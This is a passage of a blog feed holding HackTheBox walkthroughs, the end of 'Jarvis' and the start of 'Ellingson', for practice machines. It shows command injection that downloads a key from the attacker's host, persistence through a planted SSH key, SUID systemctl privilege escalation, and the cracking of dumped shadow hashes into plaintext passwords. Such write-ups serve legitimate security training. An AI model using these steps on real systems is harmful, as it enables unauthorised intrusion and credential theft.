&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We notice the &lt;code&gt;exec_ping&lt;/code&gt; function calling &lt;code&gt;os.system()&lt;/code&gt;. As there is forbidden
character we cannot simply execute a second command (with a &lt;code&gt;;&lt;/code&gt; or a &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;).
Nevertheless we can try to ping the result of a command with the following
&lt;code&gt;$(&amp;lt;command&amp;gt;)&lt;/code&gt;.
We mount a python web server with our ssh public key renamed &lt;code&gt;authorized\_keys&lt;/code&gt; and
download it from the box:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Enter an IP: $(wget 10.10.15.31:8080/authorized_keys)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then create the &lt;code&gt;.ssh&lt;/code&gt; folder in pepper home and move the key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Enter an IP: $(mkdir /home/pepper/.ssh)&lt;/span&gt;
&lt;span class="code-line"&gt;Enter an IP: $(mv authorized_keys /home/pepper/.ssh/)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then connect to the box with ssh and get the user flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh -lpepper 10.10.10.143&lt;/span&gt;
&lt;span class="code-line"&gt;Linux jarvis 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Thu Oct  3 09:38:52 2019 from 10.10.15.31&lt;/span&gt;
&lt;span class="code-line"&gt;pepper@jarvis:~$ cat user.txt &lt;/span&gt;
&lt;span class="code-line"&gt;2afa36&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="lets-get-root"&gt;Let's get root&lt;/h1&gt;
&lt;p&gt;We enumerate the box as always.
We found that the systemctl binary is SUID.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pepper@jarvis:~$ find / -uid 0 -perm -4000 -type f 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/fusermount&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/mount&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/ping&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/systemctl&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/umount&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/su&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/newgrp&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/gpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/chsh&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/sudo&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/chfn&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/eject/dmcrypt-get-device&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/openssh/ssh-keysign&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href="https://gtfobins.github.io/gtfobins/systemctl/#suid"&gt;GTFOBins&lt;/a&gt; show how
to exploit that misconfiguration.
First we create a temporary file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pepper@jarvis:~$ TF=$(mktemp).service&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We write a service file inside. This service run the command &lt;code&gt;id&lt;/code&gt; and put the
result in a file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pepper@jarvis:~$ echo &amp;#39;[Service]&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; Type=oneshot&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; ExecStart=/bin/sh -c &amp;quot;id &amp;gt; /tmp/output&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; [Install]&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; WantedBy=multi-user.target&amp;#39; &amp;gt; $TF&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We link the service using sysemctl:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pepper@jarvis:~$ /bin/systemctl link $TF&lt;/span&gt;
&lt;span class="code-line"&gt;Created symlink /etc/systemd/system/tmp.iyGBjTyKtn.service → /tmp/tmp.iyGBjTyKtn.service.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We start the service using sysemctl:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pepper@jarvis:~$ /bin/systemctl enable --now $TF&lt;/span&gt;
&lt;span class="code-line"&gt;Created symlink /etc/systemd/system/multi-user.target.wants/tmp.iyGBjTyKtn.service → /tmp/tmp.iyGBjTyKtn.service.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get the result of the &lt;code&gt;id&lt;/code&gt; command in &lt;code&gt;/tmp/output&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pepper@jarvis:~$ cat /tmp/output &lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The command was executed. Now we create a second service which will output the
root's flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pepper@jarvis:~$ TF2=$(mktemp).service&lt;/span&gt;
&lt;span class="code-line"&gt;pepper@jarvis:~$ echo &amp;#39;[Service]&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; Type=oneshot&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; ExecStart=/bin/sh -c &amp;quot;cat /root/root.txt &amp;gt; /tmp/output&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; [Install]&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; WantedBy=multi-user.target&amp;#39; &amp;gt; $TF2&lt;/span&gt;
&lt;span class="code-line"&gt;pepper@jarvis:~$ /bin/systemctl link $TF2&lt;/span&gt;
&lt;span class="code-line"&gt;Created symlink /etc/systemd/system/tmp.ZcSgmH8PDr.service → /tmp/tmp.ZcSgmH8PDr.service.&lt;/span&gt;
&lt;span class="code-line"&gt;pepper@jarvis:~$ /bin/systemctl enable --now $TF2&lt;/span&gt;
&lt;span class="code-line"&gt;Created symlink /etc/systemd/system/multi-user.target.wants/tmp.ZcSgmH8PDr.service → /tmp/tmp.ZcSgmH8PDr.service.&lt;/span&gt;
&lt;span class="code-line"&gt;pepper@jarvis:~$ cat /tmp/output &lt;/span&gt;
&lt;span class="code-line"&gt;d41d8&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was a nice one. It has been a long time since my last usage of
&lt;code&gt;sqlmap --os-shell&lt;/code&gt; command.
The movement from &lt;code&gt;www-data&lt;/code&gt; to &lt;code&gt;pepper&lt;/code&gt; was easy and the privilege
escalation let me learn new things about systemd.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="SQLi"></category><category term="linux"></category></entry><entry><title>HTB: Ellingson</title><link href="https://maggick.fr/2019/10/htb-ellingson.html" rel="alternate"></link><published>2019-10-21T11:25:00+02:00</published><updated>2019-10-21T11:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-10-21:/2019/10/htb-ellingson.html</id><summary type="html">&lt;p&gt;&lt;img alt="Ellingson card" class="align-left" src="/media/2019.10/ellingson_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/189"&gt;Ellingson&lt;/a&gt;
This box is classified as a hard machine. The user is not too hard to get as it
require to know python and password's cracking. The root part is really hard as this
require the exploitation of a ROP buffer overflow.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: if you just want to play with the buffer overflow, the binary is
 available on this site, just go to the
 &lt;a href="https://maggick.fr/2019/10/htb-ellingson.html#analysing-the-buffer-overflow"&gt;"Analysing the Buffer Overflow" section&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2019.10/ellingson_card.png" alt="Ellingson card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/189"&gt;Ellingson&lt;/a&gt;
This box is classified as a hard machine. The user is not too hard to get as it
require to know python and password's cracking. The root part is really hard as this
require the exploitation of a ROP buffer overflow.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: if you just want to play with the buffer overflow, the binary is
 available on this site, just go to the
 &lt;a href="https://maggick.fr/2019/10/htb-ellingson.html#analysing-the-buffer-overflow"&gt;"Analysing the Buffer Overflow" section&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;


&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Sep 26 13:34:45 2019 as: nmap -oA 10.10.10.139 -sSV 10.10.10.139&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.139&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.086s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 998 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    nginx 1.14.0 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Sep 26 13:35:00 2019 -- 1 IP address (1 host up) scanned in 14.76 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="web"&gt;Web&lt;/h1&gt;
&lt;p&gt;The website is a standard corporate website (we can appreciate the dynamic rendering).&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ellingson web page" src="/media/2019.10/ellingson_1.png"&gt;&lt;/p&gt;
&lt;p&gt;When browsing the articles, we notice that there is an ID at the end of the URL.
If we put a non standard value like &lt;code&gt;2-1&lt;/code&gt; or put an ID greater than expected we
generate an error and a stacktrace. This debugger integrate a python
interpretor:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Werkzeug debugger" src="/media/2019.10/ellingson_3.png"&gt;&lt;/p&gt;
&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;p&gt;From there we can input python's commands and using the &lt;code&gt;OS&lt;/code&gt; module we can
execute command on the system. In order to get a shell we can simply upload our
SSH public key in the current user (hal) &lt;code&gt;authorized_keys&lt;/code&gt; file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import os; os.popen(&amp;#39;whoami&amp;#39;).read()&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;hal\n&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; import os; os.system(&amp;#39;mkdir ~/.ssh/&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;256&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; import os; os.system(&amp;#39;echo \&amp;#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6A/eqoQWIz14pbJ4L3Tsf+GzWv/O8Ym81ICPKpmyEl9cr3DyqCETUijFpMl6LYsdgc97EEdR6d2Xa2mpGMyDHRJSQGJJf2KehUBi6EqrkyEnPfMWNso50UtvzLwOUuxXTYmQ8iTGk3V5PbM0NHG7UQsABELrDL11NNKlV3XkuHE/yTuJQ0f80/ZDQFC7BzIfsl5iE3RmE+kRxTOyxniGwFW1bxYVW1Iqfw7isNVSyn0lkRgkSQjb2fKtFPdGughBm2j3O0+aPrRQyC7iytabc/Y8R248ziAVxqP/Nq8CEFAGXXoX8LS9WSIUfvMwqWevjbUxIKivOfGP9G8Tb994KaQFPUH13oku6GtoymAcaKjuscAHiD7q+1RJqOLg1qV7HVOzMFe46NdmGrK1dGqydfkTVjgwWJk0Swe/wJM8bIYIt6rG8/1kKDgBh86XeP4HDtj+fQo0+07RVrnFXPdBliyKPWIV2sz+qO/JCyX73YgYupps1/lsLb+l4N1BaUnk=\&amp;#39;&amp;gt;&amp;gt;~/.ssh/authorized_keys&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;0&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; import os; os.system(&amp;#39;chmod 644 ~/.ssh/authorized_keys&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;0&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As our SSH public key is in hal's &lt;code&gt;authorzied_key&lt;/code&gt; we can connect as hal using
SSH and starting to enumerate. The user flag is not in the hal's home folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh 10.10.10.139 -lhal&lt;/span&gt;
&lt;span class="code-line"&gt;hal@ellingson:~$ whoami&lt;/span&gt;
&lt;span class="code-line"&gt;hal&lt;/span&gt;
&lt;span class="code-line"&gt;hal@ellingson:~$ ls /home/&lt;/span&gt;
&lt;span class="code-line"&gt;duke  hal  margo  theplague&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We enumerate the box and find an interesting non standard SUID binary:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;hal@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/newgrp&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/pkexec&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/gpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/garbage&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/newuidmap&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/sudo&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/traceroute6.iputils&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/chfn&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/newgidmap&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/chsh&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/policykit-1/polkit-agent-helper-1&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/openssh/ssh-keysign&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/eject/dmcrypt-get-device&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/snapd/snap-confine&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/su&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/umount&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/ntfs-3g&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/ping&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/mount&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/fusermount&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Nevertheless we do not have the permission to execute it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;hal@ellingson:~$ ls -al /usr/bin/garbage&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 18056 Mar  9  2019 /usr/bin/garbage&lt;/span&gt;
&lt;span class="code-line"&gt;hal@ellingson:~$ /usr/bin/garbage&lt;/span&gt;
&lt;span class="code-line"&gt;User is not authorized to access this application. This attempt has been logged.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We need another way. We see that we are in the group &lt;code&gt;adm&lt;/code&gt; (in addition to our user group):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;hal@ellingson:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;I struggled for a long time here before someone on the official discord told
me that after a few hours
the file permissions are changed and the file does not belong to &lt;code&gt;adm&lt;/code&gt; group
anymore. I had to reset the box to find this file.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Let us list what files are belonging to this group:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;hal@ellingson:~$ find / -group adm 2&amp;gt; /dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/var/backups/shadow.bak&lt;/span&gt;
&lt;span class="code-line"&gt;/var/spool/rsyslog&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/auth.log&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/mail.err&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/fail2ban.log&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/kern.log&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/syslog&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/nginx&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/nginx/error.log&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/nginx/access.log&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/cloud-init.log&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/unattended-upgrades&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/apt/term.log&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/apport.log&lt;/span&gt;
&lt;span class="code-line"&gt;/var/log/mail.log&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/6405/var/log/dmesg&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/6405/var/log/fsck/checkfs&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/6405/var/log/fsck/checkroot&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/6405/var/spool/rsyslog&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/4917/var/log/dmesg&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/4917/var/log/fsck/checkfs&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/4917/var/log/fsck/checkroot&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/4917/var/spool/rsyslog&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/6818/var/log/dmesg&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/6818/var/log/fsck/checkfs&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/6818/var/log/fsck/checkroot&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/core/6818/var/spool/rsyslog&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We cat the shadow.bak file and get some password hashes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;hal@ellingson:~$ cat /var/backups/shadow.bak&lt;/span&gt;
&lt;span class="code-line"&gt;root:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;bin:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;sys:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;sync:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;games:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;man:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;lp:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;mail:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;news:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;uucp:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;proxy:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;www-data:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;backup:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;list:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;irc:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;gnats:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-network:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-resolve:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;syslog:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;messagebus:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;_apt:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;lxd:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;uuidd:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;dnsmasq:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;landscape:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;pollinate:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;sshd:*:17737:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let's crack them! It is a bit long as the hashing algorithm is SHA512 ($6). We
use &lt;code&gt;john&lt;/code&gt; with the rockyou dictionary.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;john --show hash&lt;/span&gt;
&lt;span class="code-line"&gt;theplague:password123:17964:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;margo:iamgod$08:17964:0:99999:7:::&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The first password was changed, as mention in the third article:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We have recently detected suspicious activity on the network. Please make
sure you change your password regularly and read my carefully prepared memo
on the most commonly used passwords. Now as I so meticulously pointed out
the most common passwords are. Love, Secret, Sex and God -The Plague&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Nevertheless, we can connect as &lt;code&gt;margo&lt;/code&gt; using SSH and the cracked password. And we
retrieved the user flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh 10.10.10.139 -lmargo&lt;/span&gt;
&lt;span class="code-line"&gt;margo@10.10.10.139&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Wed Oct  2 12:25:47 2019 from 10.10.15.42&lt;/span&gt;
&lt;span class="code-line"&gt;margo@ellingson:~$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;margo@ellingson:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;d0ff9e&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;h2 id="finding-the-suid-binary"&gt;Finding the SUID binary&lt;/h2&gt;
&lt;p&gt;Let's get back to the SUID binary:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;margo@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/newgrp&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/pkexec&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/gpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/garbage&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/newuidmap&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/sudo&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/traceroute6.iputils&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/chfn&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run the binary, it ask for a password user input. If we put a wrong password
we get an access denied. If we put a "long" password we get a segfault. This
look like a buffer overflow:&lt;/p&gt;
